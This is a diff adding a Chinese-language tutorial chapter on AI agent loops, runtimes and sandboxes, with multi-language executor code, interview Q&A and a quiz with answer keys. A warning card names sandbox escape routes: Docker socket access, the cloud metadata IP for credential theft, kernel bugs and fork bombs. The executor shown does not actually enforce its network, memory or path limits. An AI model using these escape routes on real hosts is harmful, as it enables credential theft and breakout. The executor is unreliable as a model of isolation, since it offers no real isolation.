+            "code_execution": {MaxCpuSeconds: 30, MaxMemoryMB: 512, MaxOutputBytes: 100000, NetworkDisabled: true, AllowedPaths: []string{"/tmp/sandbox"}},
+            "web_search":     {MaxCpuSeconds: 10, MaxMemoryMB: 256, MaxOutputBytes: 10000, NetworkDisabled: false, AllowedPaths: []string{"/tmp/sandbox"}},
+        },
+    }
+}
+
+func (s *SandboxExecutor) ExecuteInSandbox(skillName, toolName, code string, timeout int) map[string]interface{} {
+    config, ok := s.SandboxConfig[skillName]
+    if !ok {
+        config = s.SandboxConfig["code_execution"]
+    }
+    if timeout &gt; config.MaxCpuSeconds {
+        timeout = config.MaxCpuSeconds
+    }
+
+    // 写入临时文件
+    tmpPath := fmt.Sprintf("/tmp/sandbox/%d_%s.py", os.Getpid(), toolName)
+    os.WriteFile(tmpPath, []byte(code), 0644)
+
+    ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
+    defer cancel()
+
+    cmd := exec.CommandContext(ctx, "python3", tmpPath)
+    cmd.Env = []string{"PATH=/usr/bin", "HOME=/tmp/sandbox"}
+    output, err := cmd.CombinedOutput()
+
+    os.Remove(tmpPath) // 清理
+
+    if err != nil {
+        if ctx.Err() == context.DeadlineExceeded {
+            return map[string]interface{}{"error": fmt.Sprintf("执行超时（%ds）", timeout)}
+        }
+        return map[string]interface{}{"error": err.Error(), "stderr": string(output)}
+    }
+    return map[string]interface{}{"stdout": string(output[:min(len(output), config.MaxOutputBytes)])}
+}</pre></div>
+<div class="code-lang-pane" data-lang="java" data-label="Java"><pre>import java.io.*;
+import java.util.*;
+import java.util.concurrent.*;
+
+public class SandboxExecutor {
+    private final Map&lt;String, SandboxConfig&gt; sandboxConfig = Map.of(
+        "code_execution", new SandboxConfig(30, 512, 100_000, true, List.of("/tmp/sandbox")),
+        "web_search", new SandboxConfig(10, 256, 10_000, false, List.of("/tmp/sandbox"))
+    );
+
+    public Map&lt;String, Object&gt; executeInSandbox(String skillName, String toolName,
+                                                  String code, int timeout) {
+        SandboxConfig config = sandboxConfig.getOrDefault(skillName, sandboxConfig.get("code_execution"));
+        timeout = Math.min(timeout, config.maxCpuSeconds);
+
+        String tmpPath = String.format("/tmp/sandbox/%d_%s.py", ProcessHandle.current().pid(), toolName);
+        try {
+            Files.writeString(Path.of(tmpPath), code);
+        } catch (IOException e) {
+            return Map.of("error", "写入临时文件失败");
+        }
+
+        ProcessBuilder pb = new ProcessBuilder("python3", tmpPath);
+        pb.environment().put("PATH", "/usr/bin");
+        pb.environment().put("HOME", "/tmp/sandbox");
+        pb.redirectErrorStream(true);
+
+        try {
+            Process proc = pb.start();
+            boolean finished = proc.waitFor(timeout, TimeUnit.SECONDS);
+            if (!finished) {
+                proc.destroyForcibly();
+                return Map.of("error", String.format("执行超时（%ds）", timeout));
+            }
+            String output = new String(proc.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+            return Map.of("stdout", output.substring(0, Math.min(output.length(), config.maxOutputBytes)),
+                          "exitCode", proc.exitValue());
+        } catch (Exception e) {
+            return Map.of("error", e.getMessage());
+        } finally {
+            Files.deleteIfExists(Path.of(tmpPath));
+        }
+    }
+}</pre></div>
+</div>
+
+<h3 class="sub-heading">21.4.4 Sandbox Escape 风险与防御</h3>
+
+<div class="card" style="border-left: 3px solid var(--color-error);">
+  <div class="card-title">⚠️ 常见 Sandbox 逃逸路径</div>
+  <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 2;">
+    <li><strong>Docker Socket 暴露</strong>：容器内访问 <code>/var/run/docker.sock</code>，可直接创建特权容器逃逸</li>
+    <li><strong>云元数据 API</strong>：访问 <code>169.254.169.254</code>，获取云厂商 IAM 凭证</li>
+    <li><strong>内核漏洞</strong>：容器共享宿主机内核，内核漏洞可被利用逃逸</li>
+    <li><strong>资源耗尽</strong>：fork bomb、内存炸弹耗尽宿主机资源</li>
+  </ul>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-success);">
+  <div class="card-title">🛡️ 黄金法则：最小权限原则</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">Agent Sandbox 应遵循<strong>默认拒绝一切，按需开白</strong>原则。</p>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">绝对不能暴露给 Sandbox 的资源：宿主机 Docker Socket、云厂商元数据 API、内网服务发现端口、SSH 私钥目录。</p>
+</div>
+
+<!-- ===== 21.5 三者协同 ===== -->
+<h2 class="section-heading">21.5 三者协同：完整协作流程</h2>
+
+<p>在真实的 Agent 系统中，Loop、Runtime 和 Sandbox 是紧密耦合的：Loop 调度 Runtime，Runtime 委托 Sandbox 执行不可信代码。以下是一次典型的"写代码→运行→修复"任务的完整执行路径：</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"user","label":"用户：帮我写个排序算法","type":"start"},{"id":"loop1","label":"Agent Loop 第1轮\nPerceive→Reason→Plan\n决策：调用 code_gen 工具","type":"process"},{"id":"runtime1","label":"Runtime\n工具注册层：校验参数\n执行调度层：提交到 Sandbox","type":"process"},{"id":"sandbox1","label":"Sandbox\n创建隔离容器\n执行 python3 sort.py\n结果：SyntaxError","type":"process"},{"id":"loop2","label":"Agent Loop 第2轮\nObserve→Evaluate\n检测到语法错误\n决策：调用 code_fix 工具","type":"process"},{"id":"runtime2","label":"Runtime\n工具注册层：校验修复参数\n记忆管理层：更新上下文","type":"process"},{"id":"sandbox2","label":"Sandbox\n执行修复后的代码\n结果：排序正确","type":"process"},{"id":"loop3","label":"Agent Loop 第3轮\nEvaluate：任务完成\n返回 Final Answer","type":"end"}],"edges":[{"from":"user","to":"loop1"},{"from":"loop1","to":"runtime1"},{"from":"runtime1","to":"sandbox1"},{"from":"sandbox1","to":"loop2"},{"from":"loop2","to":"runtime2"},{"from":"runtime2","to":"sandbox2"},{"from":"sandbox2","to":"loop3"}]}'></div>
+
+<h3 class="sub-heading">21.5.1 Loop + Runtime + Sandbox 集成实现</h3>
+
+<div class="code-block" data-multi-lang>
+<div class="code-lang-pane" data-lang="python" data-label="Python"><pre>class SecureAgent:
+    """完整集成：AgentLoop + Runtime（ToolRegistry + Memory） + SandboxExecutor"""
+
+    def __init__(self, llm, sandbox: SandboxExecutor):
+        self.loop = AgentLoop(llm, tools=[], memory=InMemoryMemory(), max_turns=10)
+        self.registry = ToolRegistry()
+        self.sandbox = sandbox
+
+        # 注册工具：代码生成（在 Sandbox 中执行）
+        self.registry.register(
+            name="execute_code",
+            description="在安全沙箱中执行Python代码",
+            parameters={"code": {"type": "string", "required": True, "description": "Python代码"}},
+            handler=lambda args: self.sandbox.execute_in_sandbox(
+                "code_execution", "execute_code", args["code"]),
+            allowed_roles=["assistant"],
+        )
+
+        # 注册工具：搜索
+        self.registry.register(
+            name="web_search",
+            description="搜索网页内容",
+            parameters={"query": {"type": "string", "required": True}},
+            handler=lambda args: search_web(args["query"]),
+            allowed_roles=["*"],
+        )
+
+        self.loop.tools = self.registry.tools
+
+    def run(self, user_input: str) -> str:
+        """运行完整的 Agent 系统"""
+        return self.loop.run(user_input)</pre></div>
+<div class="code-lang-pane" data-lang="typescript" data-label="TypeScript"><pre>class SecureAgent {
+  private loop: AgentLoop;
+  private registry: ToolRegistry;
+  private sandbox: SandboxExecutor;
+
+  constructor(llm: LLMClient, sandbox: SandboxExecutor) {
+    this.loop = new AgentLoop(llm, [], new InMemoryMemory(), 10);
+    this.registry = new ToolRegistry();
+    this.sandbox = sandbox;
+
+    // 注册工具：代码生成（在 Sandbox 中执行）
+    this.registry.register(
+      "execute_code",
+      "在安全沙箱中执行代码",
+      { code: { type: "string", required: true, description: "代码" } },
+      async (args) =&gt; this.sandbox.executeInSandbox("code_execution", "execute_code", args.code as string),
+      ["assistant"],
+    );
+
+    // 注册工具：搜索
+    this.registry.register(
+      "web_search",
+      "搜索网页内容",
+      { query: { type: "string", required: true } },
+      async (args) =&gt; searchWeb(args.query as string),
+      ["*"],
+    );
+  }
+
+  async run(userInput: string): Promise&lt;string&gt; {
+    return this.loop.run(userInput);
+  }
+}</pre></div>
+<div class="code-lang-pane" data-lang="go" data-label="Go"><pre>type SecureAgent struct {
+    loop     *AgentLoop
+    registry *ToolRegistry
+    sandbox  *SandboxExecutor
+}
+
+func NewSecureAgent(llm LLMClient, sandbox *SandboxExecutor) *SecureAgent {
+    registry := NewToolRegistry()
+
+    // 注册工具：代码生成（在 Sandbox 中执行）
+    registry.Register("execute_code", "在安全沙箱中执行代码",
+        map[string]ParamSpec{"code": {Type: "string", Required: true}},
+        func(args map[string]interface{}) (interface{}, error) {
+            code, _ := args["code"].(string)
+            result := sandbox.ExecuteInSandbox("code_execution", "execute_code", code, 30)
+            return result, nil
+        },
+        []string{"assistant"},
+    )
+
+    // 注册工具：搜索
+    registry.Register("web_search", "搜索网页内容",
+        map[string]ParamSpec{"query": {Type: "string", Required: true}},
+        func(args map[string]interface{}) (interface{}, error) {
+            query, _ := args["query"].(string)
+            return SearchWeb(query), nil
+        },
+        []string{"*"},
+    )
+
+    loop := &AgentLoop{llm: llm, tools: registry.tools, memory: NewInMemoryMemory(), maxTurns: 10}
+
+    return &SecureAgent{loop, registry, sandbox}
+}
+
+func (sa *SecureAgent) Run(userInput string) (string, error) {
+    return sa.loop.Run(userInput)
+}</pre></div>
+<div class="code-lang-pane" data-lang="java" data-label="Java"><pre>public class SecureAgent {
+    private final AgentLoop loop;
+    private final ToolRegistry registry;
+    private final SandboxExecutor sandbox;
+
+    public SecureAgent(LLMClient llm, SandboxExecutor sandbox) {
+        this.registry = new ToolRegistry();
+        this.sandbox = sandbox;
+
+        // 注册工具：代码生成（在 Sandbox 中执行）
+        registry.register("execute_code", "在安全沙箱中执行代码",
+            Map.of("code", new ParamSpec("string", true, "代码")),
+            args =&gt; sandbox.executeInSandbox("code_execution", "execute_code",
+                    (String) args.get("code"), 30),
+            List.of("assistant"));
+
+        // 注册工具：搜索
+        registry.register("web_search", "搜索网页内容",
+            Map.of("query", new ParamSpec("string", true, "搜索关键词")),
+            args =&gt; searchWeb((String) args.get("query")),
+            List.of("*"));
+
+        this.loop = new AgentLoop(llm, registry.getToolsMap(), new InMemoryMemory(), 10);
+    }
+
+    public String run(String userInput) throws MaxTurnsExceeded {
+        return loop.run(userInput);
+    }
+}</pre></div>
+</div>
+
+<h3 class="sub-heading">21.5.2 职责边界</h3>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">问题</th>
+        <th style="text-align: left;">负责方</th>
+        <th style="text-align: left;">具体做法</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td>Agent 该做什么决策？</td><td><strong>Agent Loop</strong></td><td>LLM 推理决定下一步行动</td></tr>
+      <tr><td>工具参数是否合法？</td><td><strong>Runtime 工具注册层</strong></td><td>校验参数类型、值域、必填项</td></tr>
+      <tr><td>调用是否有权限？</td><td><strong>Runtime 权限控制层</strong></td><td>角色权限矩阵 + 审批机制</td></tr>
+      <tr><td>代码在哪里执行？</td><td><strong>Sandbox</strong></td><td>创建隔离环境、限制资源</td></tr>
+      <tr><td>执行超时怎么办？</td><td><strong>Sandbox</strong></td><td>设置超时上限，超时自动终止</td></tr>
+      <tr><td>历史对话太长怎么办？</td><td><strong>Runtime 记忆管理层</strong></td><td>滑动窗口压缩 + 摘要替代</td></tr>
+      <tr><td>工具调用日志在哪看？</td><td><strong>Runtime 可观测层</strong></td><td>OpenTelemetry + Dashboard</td></tr>
+      <tr><td>Agent 陷入死循环？</td><td><strong>Agent Loop + Runtime</strong></td><td>Loop 设置 max_turns，Runtime 设置熔断</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- ===== 八股总结 ===== -->
+<div class="summary-box">
+  <div class="summary-title">📋 八股总结 — 面试高频考点</div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q1: Agent Loop 的6步执行流程是什么？为什么是循环而不是一次生成？</div>
+    <div class="qa-answer">
+      6步：<strong>感知(Perceive) → 推理(Reason) → 规划(Plan) → 执行(Act) → 观察(Observe) → 评估(Evaluate)</strong>。<br><br>
+      循环是因为 Agent 需要根据工具返回结果<strong>动态调整策略</strong>——单次生成无法应对"API返回错误"或"数据格式不符"等真实场景。类比：人是"边做边调整"的，不是"想完一次做完"。每轮工具调用的结果会触发下一轮推理——这就是<strong>事件驱动</strong>的本质。
+    </div>
+  </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q2: Runtime 和 Agent Loop 有什么区别？一句话解释？</div>
+    <div class="qa-answer">
+      <strong>Loop 决定"做什么"（决策层），Runtime 决定"怎么做"（基础设施层）</strong>。<br><br>
+      类比：Loop 是司机决定去哪，Runtime 是汽车提供引擎、导航、刹车；Sandbox 是护栏限制速度和路线。<br><br>
+      Runtime 的五层架构：① LLM管理层（模型路由、Token管理、重试降级）；② 工具注册层（定义、校验、权限、日志）；③ 记忆管理层（短期/长期/工作记忆）；④ 执行调度层（Loop引擎、并发、超时熔断）；⑤ 可观测层（Tracing、Metrics、Logging）。
+    </div>
+  </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q3: Docker 容器和 Firecracker 微虚拟机做 Sandbox 有什么区别？</div>
+    <div class="qa-answer">
+      <strong>Docker</strong> 共享宿主机内核——隔离在进程/文件系统层面，内核漏洞可逃逸。<br>
+      <strong>Firecracker</strong> 每个沙箱运行独立内核——内核级隔离，逃逸难度极高。<br><br>
+      代价对比：Docker 启动秒级、资源开销小；Firecracker 启动约125ms、资源开销更大。<br><br>
+      <strong>选型原则</strong>：金融/医疗等高安全场景选 Firecracker，一般 Web 场景 Docker 够用，不想自建选 E2B/Modal 等云沙箱服务。
+    </div>
+  </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q4: Agent 陷入死循环怎么解决？</div>
+    <div class="qa-answer">
+      <strong>三层防护</strong>：<br><br>
+      ① <strong>Loop 层</strong>：设置 max_turns 上限（如20轮），超过直接终止或降级；<br>
+      ② <strong>Runtime 层</strong>：熔断机制——同工具连续失败N次后降级或切换策略，设置指数退避重试；<br>
+      ③ <strong>Sandbox 层</strong>：超时保护——单个工具调用超过阈值（如30s）自动终止进程。<br><br>
+      类比：① 是方向盘锁定（超圈数停车）；② 是刹车片（连续失败减速）；③ 是断油阀（超时断供）。
+    </div>
+  </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q5: Loop、Runtime、Sandbox 三者的嵌套关系？各层的职责边界？</div>
+    <div class="qa-answer">
+      <strong>嵌套关系</strong>：Sandbox 在最外层（所有行为在约束下执行），Runtime 在中间层（提供基础设施），Agent Loop 在最内层（决策循环）。<br><br>
+      <strong>职责边界</strong>：<br>
+      ① Agent 该做什么决策？→ <strong>Agent Loop</strong>（LLM 推理决定下一步行动）；<br>
+      ② 工具参数是否合法？→ <strong>Runtime 工具注册层</strong>（校验类型、值域、必填项）；<br>
+      ③ 调用是否有权限？→ <strong>Runtime 权限控制层</strong>（角色权限矩阵 + 审批机制）；<br>
+      ④ 代码在哪里执行？→ <strong>Sandbox</strong>（创建隔离环境、限制资源）；<br>
+      ⑤ 历史对话太长怎么办？→ <strong>Runtime 记忆管理层</strong>（滑动窗口压缩 + 摘要替代）。
+    </div>
+  </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q6: ReAct、ReWOO、LLM Compiler、Reflexion 四种 Loop 模式的核心区别？</div>
+    <div class="qa-answer">
+      <strong>ReAct</strong>：推理+行动交替循环——灵活可解释，但每轮都调LLM，Token消耗大。<br>
+      <strong>ReWOO</strong>：规划→执行→求解三阶段——减少LLM调用次数，但规划不可动态调整。<br>
+      <strong>LLM Compiler</strong>：并行执行多个工具——效率高延迟低，但依赖之间不可并行。<br>
+      <strong>Reflexion</strong>：执行后反思自我纠正——自我进化持续改进，但反思轮次可能过多。<br><br>
+      面试要点：80%场景 ReAct 够用；需要减少 LLM 调用选 ReWOO；追求效率选 LLM Compiler；需要自我纠正选 Reflexion。
+    </div>
+  </div>
+</div>
+
+<!-- ===== Quiz ===== -->
+<div id="quizArea"></div>
+
+<script>
+const ch21Questions = [
+  {
+    type: 'single',
+    question: 'Agent Loop 的六步执行流程顺序是？',
+    options: [
+      'Perceive → Act → Reason → Plan → Observe → Evaluate',
+      'Perceive → Reason → Plan → Act → Observe → Evaluate',
+      'Reason → Plan → Act → Observe → Evaluate → Perceive',
+      'Plan → Perceive → Reason → Act → Observe → Evaluate'
+    ],
+    answer: [1],
+    explanation: '标准 Agent Loop 六步流程为：感知(Perceive) → 推理(Reason) → 规划(Plan) → 执行(Act) → 观察(Observe) → 评估(Evaluate)。这是一个事件驱动的循环，每轮工具调用结果触发下一轮推理。'
+  },
+  {
+    type: 'single',
+    question: 'Loop、Runtime、Sandbox 三者的嵌套关系是？',
+    options: [
+      'Loop 在最外层，Runtime 在中间层，Sandbox 在最内层',
+      'Runtime 在最外层，Sandbox 在中间层，Loop 在最内层',
+      'Sandbox 在最外层，Runtime 在中间层，Loop 在最内层',
+      '三者并列，无嵌套关系'
+    ],
+    answer: [2],
+    explanation: 'Sandbox 在最外层（所有 Agent 行为最终都在某个隔离环境中执行），Runtime 在中间层（为 Loop 提供基础设施），Agent Loop 在最内层（是 Runtime 中的逻辑循环）。'
+  },
+  {
+    type: 'single',
+    question: 'Firecracker 微虚拟机与 Docker 容器的主要区别是？',
+    options: [
+      'Firecracker 更轻量，启动更快',
+      'Docker 提供内核级隔离，Firecracker 只隔离进程',
+      'Firecracker 每个沙箱运行独立内核，Docker 共享宿主机内核',
+      '两者隔离级别相同，只是实现方式不同'
+    ],
+    answer: [2],
+    explanation: 'Docker 容器共享宿主机内核，隔离在进程和文件系统层面。Firecracker 每个微虚拟机运行独立内核，提供内核级隔离，逃逸难度极高。Firecracker 启动约125ms，比传统VM快，但比Docker慢。'
+  },
+  {
+    type: 'multiple',
+    question: 'Agent Loop 的常见设计陷阱有哪些？（多选）',
+    options: [
+      '死循环：工具永远失败但 LLM 一直重试',
+      'Token 爆炸：每轮把全部历史塞入 Context Window',
+      '幻觉工具调用：LLM 调用不存在或参数错误的工具',
+      '并行过多：同时调用太多工具导致超时'
+    ],
+    answer: [0, 1, 2],
+    explanation: '三大陷阱：① 死循环——工具连续失败但Agent不停重试（对策：max_turns + 错误重试退避）；② Token 爆炸——每轮重复全部历史（对策：滑动窗口压缩 + 摘要替代）；③ 幻觉工具调用——LLM 调用不存在的工具或传错参数（对策：Runtime 层参数校验）。'
+  }
+];
+
+setTimeout(() => { Quiz.render('quizArea', ch21Questions); }, 500);
+</script>
